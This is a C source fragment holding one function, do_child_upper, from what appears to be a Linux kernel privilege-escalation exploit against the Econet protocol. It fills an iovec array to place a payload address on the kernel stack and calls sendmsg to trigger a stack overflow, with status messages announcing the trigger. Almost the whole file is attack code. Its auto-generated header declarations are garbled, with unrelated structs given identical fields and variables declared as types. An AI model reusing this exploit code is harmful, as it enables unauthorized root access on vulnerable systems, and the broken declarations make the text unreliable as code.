
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






struct sockaddr_ec {int msg_namelen; int msg_iovlen; struct iovec* msg_iov; scalar_t__ msg_flags; struct sockaddr_ec* msg_name; int ifr_name; } ;
struct msghdr {int msg_namelen; int msg_iovlen; struct iovec* msg_iov; scalar_t__ msg_flags; struct msghdr* msg_name; int ifr_name; } ;
struct iovec {int iov_len; void* iov_base; } ;
struct ifreq {int msg_namelen; int msg_iovlen; struct iovec* msg_iov; scalar_t__ msg_flags; struct ifreq* msg_name; int ifr_name; } ;
typedef int ifr ;
typedef int eco_msg ;
typedef int eco_addr ;


 scalar_t__ EFAULT ;
 int IOVS ;
 int PF_ECONET ;
 int SIOCSIFADDR ;
 int SOCK_DGRAM ;
 int STACK_OFFSET ;
 int close (int) ;
 scalar_t__ errno ;
 int exit (int) ;
 int ioctl (int,int ,struct sockaddr_ec*) ;
 int memset (struct sockaddr_ec*,int ,int) ;
 scalar_t__ payload_child ;
 int printf (char*) ;
 int sendmsg (int,struct sockaddr_ec*,int ) ;
 int sleep (int) ;
 int socket (int ,int ,int ) ;
 int strcpy (int ,char*) ;

void
do_child_upper(void)
{
 int i, ret, eco_sock;
 struct sockaddr_ec eco_addr;
 struct msghdr eco_msg;
 struct iovec iovs[IOVS];
 struct ifreq ifr;
 char *target;


 target = (char *) payload_child;
 target += 4;


 sleep(1);


 for (i = 0; i < STACK_OFFSET; ++i) {
  iovs[i].iov_base = (void *) 0x0;
  iovs[i].iov_len = 0;
 }


 iovs[STACK_OFFSET].iov_base = (void *) target;
 iovs[STACK_OFFSET].iov_len = 0x0246;


 for (i = STACK_OFFSET + 1; i < IOVS; ++i) {
  iovs[i].iov_base = (void *) 0xffffffff00000000;
  iovs[i].iov_len = 0;
 }


 eco_sock = socket(PF_ECONET, SOCK_DGRAM, 0);
 if (eco_sock < 0) {
  printf("[-] failed creating econet socket, aborting!\n");
  exit(1);
 }

 memset(&ifr, 0, sizeof(ifr));
 strcpy(ifr.ifr_name, "lo");


 ret = ioctl(eco_sock, SIOCSIFADDR, &ifr);
 if (ret != 0) {
  printf("[-] failed setting interface address, aborting!\n");
  exit(1);
 }

 memset(&eco_addr, 0, sizeof(eco_addr));
 memset(&eco_msg, 0, sizeof(eco_msg));
 eco_msg.msg_name = &eco_addr;
 eco_msg.msg_namelen = sizeof(eco_addr);
 eco_msg.msg_flags = 0;
 eco_msg.msg_iov = &iovs[0];
 eco_msg.msg_iovlen = IOVS;

 printf("[+] upper child triggering stack overflow...\n");


 ret = sendmsg(eco_sock, &eco_msg, 0);
 if (ret != -1 || errno != EFAULT) {
  printf("[-] sendmsg succeeded unexpectedly, aborting!\n");
  exit(1);
 }

 close(eco_sock);
}
